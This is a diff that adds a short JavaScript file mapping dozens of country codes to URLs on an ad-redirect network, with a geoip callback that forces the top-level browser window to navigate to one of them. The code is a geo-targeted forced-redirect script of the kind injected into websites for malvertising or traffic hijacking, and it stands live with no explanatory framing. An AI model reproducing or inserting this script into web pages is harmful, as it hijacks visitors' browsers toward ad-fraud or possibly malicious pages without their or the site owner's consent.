@@ -1,0 +1,10 @@
+var target = [];
+
+          var dataUrl = ['//www.highcpmrevenuenetwork.com/g781fcerp?key=9531f27f533976e52308bb705d775852','//www.highcpmrevenuenetwork.com/avcqmuu6r?key=4b3ecd14ca76d9de478531bca12bab97'];
+
+var random = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+target.AR = random;target.BG = random;target.BN = random;target.BO = random;target.CV = random;target.CW = random;target.DO = random;target.GB = random;target.GR = random;target.GT = random;target.GU = random;target.HK = random;target.HN = random;target.IM = random;target.JE = random;target.JM = random;target.KH = random;target.KR = random;target.KZ = random;target.LB = random;target.LK = random;target.MA = random;target.MT = random;target.MU = random;target.MV = random;target.MX = random;target.PE = random;target.PY = random;target.RS = random;target.SA = random;target.SV = random;target.TO = random;target.TW = random;target.UZ = random;target.ZA = random;target.AE = random;target.AT = random;target.AU = random;target.AZ = random;target.BE = random;target.BM = random;target.BS = random;target.CA = random;target.CH = random;target.CK = random;target.CL = random;target.CO = random;target.CR = random;target.CZ = random;target.DE = random;target.DK = random;target.EC = random;target.EE = random;target.ES = random;target.FI = random;target.FJ = random;target.FR = random;target.GB = random;target.HR = random;target.HU = random;target.IE = random;target.IS = random;target.IT = random;target.JO = random;target.JP = random;target.KN = random;target.KW = random;target.KY = random;target.ME = random;target.MM = random;target.NL = random;target.NO = random;target.NZ = random;target.PA = random;target.PG = random;target.PL = random;target.PR = random;target.PT = random;target.QA = random;target.SE = random;target.SI = random;target.SK = random;target.US = random;target.UY = random;target.VG = random;
+target.All  = "//www.highcpmrevenuenetwork.com/qt5dfrx4ec?key=6b17dba883adf7dc33feb82108881b73";
+
+	
+        function geoip(g){window.top.location.href=target[g.country]||target.All}
